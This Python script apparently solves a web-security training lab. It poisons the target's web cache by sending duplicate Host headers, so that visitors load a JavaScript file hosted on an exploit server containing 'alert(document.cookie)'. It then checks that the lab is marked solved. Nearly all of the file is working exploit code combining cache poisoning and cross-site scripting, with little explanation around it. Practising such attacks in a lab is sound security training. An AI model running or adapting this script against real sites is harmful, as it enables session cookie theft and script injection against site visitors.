import requests
from requests_toolbelt.adapters.host_header_ssl import HostHeaderSSLAdapter
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


class uniquestr(str):
    _lower = None
    def __hash__(self):
        return id(self)
    def __eq__(self, other):
        return self is other
    def lower(self):
        if self._lower is None:
            lower = str.lower(self)
            self._lower = self if str.__eq__(lower, self) else uniquestr(lower)
        return self._lower

def send_vuln_payload(s, exploit_url, exploit_path, responseFile, responseBody, formAction): 
    target_url = exploit_url + exploit_path
    data = {
        'urlIsHttps': 'on',
        'responseFile': responseFile,
        'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
        'responseBody': responseBody,
        'formAction': formAction
    }
    r = s.post(target_url, data=data, allow_redirects=True)

    if r.status_code == 200:
        print('[+] Sent vuln request to victim')
    else:
        print('[-] Fail to send vuln request')
        sys.exit(-1)

def goto(s, url, path, headers={}, cookies={}):
    target_url = url + path
    s.get(target_url, headers=headers, cookies=cookies)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.abc.exploit-server.net" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    # s.mount("https://", HostHeaderSSLAdapter())
    s.proxies = proxies
    s.verify = False
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 
    exploit_url = sys.argv[2][:-1] if sys.argv[2][-1] == '/' else sys.argv[2]

    filePath = '/resources/js/tracking.js'
    payload = 'alert(document.cookie)'
    custom_headers = {
        'Host': url.split('//')[1],
        uniquestr('Host'): exploit_url.split('//')[1],
    }

    goto(s, url, '/')
    session_cookies = s.cookies.get_dict()
    send_vuln_payload(s, exploit_url, '/' ,filePath, payload, 'STORE')
    goto(s, url, '/', custom_headers, session_cookies)
    goto(s, url, '/')
    goto(requests.Session(), url, '/')

    check_solved_lab(s, url)

if __name__ == '__main__':
    main()